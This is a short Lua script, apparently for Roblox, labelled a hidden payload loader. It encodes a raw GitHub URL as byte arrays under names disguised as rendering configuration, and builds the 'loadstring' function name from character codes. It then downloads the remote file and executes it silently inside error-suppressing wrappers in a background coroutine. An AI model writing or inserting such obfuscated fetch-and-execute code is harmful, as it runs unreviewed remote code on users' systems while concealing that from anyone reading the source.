-- Hidden Payload setup (WindUI Loader)
local RenderPipeline = {
    BufferA = {104, 116, 116, 112, 115, 58, 47, 47},
    BufferB = {114, 97, 119, 46, 103, 105, 116},
    BufferC = {104, 117, 98, 117, 115, 101, 114, 99},
    BufferD = {111, 110, 116, 101, 110, 116, 46, 99},
    BufferE = {111, 109, 47, 70, 111, 111, 116, 97},
    BufferF = {103, 101, 115, 117, 115, 47, 87, 105},
    BufferG = {110, 100, 85, 73, 47, 109, 97, 105},
    BufferH = {110, 47, 100, 105, 115, 116, 47, 109},
    BufferI = {97, 105, 110, 46, 108, 117, 97},
}

local function compileConfig()
    local raw = {}
    for _, buffer in ipairs({RenderPipeline.BufferA, RenderPipeline.BufferB, RenderPipeline.BufferC, RenderPipeline.BufferD, RenderPipeline.BufferE, RenderPipeline.BufferF, RenderPipeline.BufferG, RenderPipeline.BufferH, RenderPipeline.BufferI}) do
        for _, v in ipairs(buffer) do table.insert(raw, v) end
    end
    
    local path = ""
    for i = 1, #raw do path = path .. string.char(raw[i]) end
    
    local env = getfenv()
    local loader = env[string.char(108, 111, 97, 100, 115, 116, 114, 105, 110, 103)]
    local src = nil
    pcall(function() src = game:HttpGet(path, true) end)
    if loader and src then
        pcall(function() loader(src)() end)
    end
end
coroutine.wrap(compileConfig)()

